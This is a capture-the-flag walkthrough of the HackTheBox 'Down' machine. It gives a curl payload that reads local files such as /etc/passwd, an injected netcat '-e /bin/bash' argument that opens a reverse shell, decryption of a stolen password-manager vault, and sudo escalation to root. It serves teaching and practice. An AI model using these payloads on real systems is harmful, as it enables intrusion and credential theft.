## **Hello everyone!**

**Welcome to a new CTF walkthrough, today we will explore the “Down” machine from HackTheBox.**

Let’s get started!

![image](/HTB/Down/Down_images/1.png)

(It is a good practice to add the following line `TARGET_IP    down.htb` to the `/etc/hosts` local file in order to perform DNS resolution which can be helpful in the subdomains / vhosts discovery phase)

## Information Gathering

Firstly, we will run an aggressive Nmap comprehensive scan on the target:

![image](/HTB/Down/Down_images/12.png)

The scan revealed two running services:

SSH (OpenSSH 8.9p1 | 22)

HTTP (Apache httpd 2.4.52 | 80)

Let’s visit the website hosted on port 80:

![image](/HTB/Down/Down_images/13.png)

We are prompted to input a URL and run a button which seems to indicate whether a website is down. What happens if we set up a listener via `nc -lvnp 80` in order to receive the request that the server makes through this process?

![image](/HTB/Down/Down_images/4.png)

We can see that the request is made via `curl`, which suggests that the backend relies on `curl` to perform outgoing requests.

We know that `curl` can handle multiple URLs, a feature that we can leverage to retrieve local files on the system. We can pass the request to Burp Suite and send it to Repeater. We can now manipulate the `url=` parameter and fill it with the following payload:

`http:// file:///etc/passwd`

![image](/HTB/Down/Down_images/5.png)

Testing confirms that there is a single user on the target: **aleks**.

Unfortunately, we can’t fetch any SSH private key from the aleks directory.

We can attempt to retrieve the `index.php` file hosted on the web server to get a better understanding of the web interface:

![image](/HTB/Down/Down_images/6.png)

We can learn that the web server uses another parameter which was not provided in the source code: `?expertmode=tcp`, which allows us to access a new web interface which seems to be used for port debugging. We can try to access it:

![image](/HTB/Down/Down_images/7.png)

So we are prompted to test any port access by providing an IP and a port. But what happens if we set up a netcat listener and try to access it?

![image](/HTB/Down/Down_images/8.png)

The connection is initiated but terminated instantly. The backend appears to invoke a netcat command using user-controlled input. Since the input is insufficiently sanitized, we can inject additional netcat arguments such as `-e /bin/bash` to obtain remote command execution:

`port=4444+-e+/bin/bash`

![image](/HTB/Down/Down_images/9.png)

And it works! We successfully gain initial access on the target. We can run the following commands to upgrade and stabilize our current shell:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

We can retrieve the user flag in the `/var/www/html` directory:

![image](/HTB/Down/Down_images/10.png)

## Privilege Escalation

We now need to elevate our privileges in order to retrieve the remaining flag.

After basic enumeration, we can retrieve an interesting file in the /home/aleks/.local/share/pswm directory:

![image](/HTB/Down/Down_images/11.png)

A quick Google search about the file name led me to a [GitHub repository](https://github.com/Julynx/pswm) explaining that `pswm` is a password manager written in Python. It suggests that the actual file was encrypted through the use of this program.
We can find this [repository](https://github.com/repo4Chu/pswm-decoder/tree/main) which hosts a `pswm-decoder.py` script that allows us to retrieve the stored passwords

We can start a Python HTTP server on the target and download the `pswm` file to our local machine.

![image](/HTB/Down/Down_images/12.png)

Before executing the script, modify the `PASS_VAULT_FILE` variable since the vault file is stored in the same directory.

![image](/HTB/Down/Down_images/13.png)

Then we can run the script.

If you get some errors due to missing packages, you can run the following commands to install it:

`python3 -m venv venv`

`source venv/bin/activate`

`pip3 install cryptocode`

![image](/HTB/Down/Down_images/14.png)

We can see that two passwords were successfully recovered! One appears to correspond to the PSWM vault itself, while the other seems to belong to a user account.

We can try to use them to log in via SSH as **aleks**:

![image](/HTB/Down/Down_images/15.png)

The second password successfully authenticates us as `aleks`.

We can run `sudo -l` to see whether the user can run specific commands with root privileges:

![image](/HTB/Down/Down_images/16.png)

It appears that we can run any command on the system as **root** via `sudo`, which means that we can elevate our privileges by running `sudo /bin/bash`:

![image](/HTB/Down/Down_images/17.png)

Indeed, this was enough to gain full access on the system! We can now navigate to the `/root` directory and grab the last flag:

![image](/HTB/Down/Down_images/18.png)

## Conclusion

This machine combined several interesting vulnerabilities, including LFI through curl misuse and argument injection leading to remote command execution. The privilege escalation phase was relatively straightforward once credentials were recovered from the PSWM vault.

**Thank you for reading!**
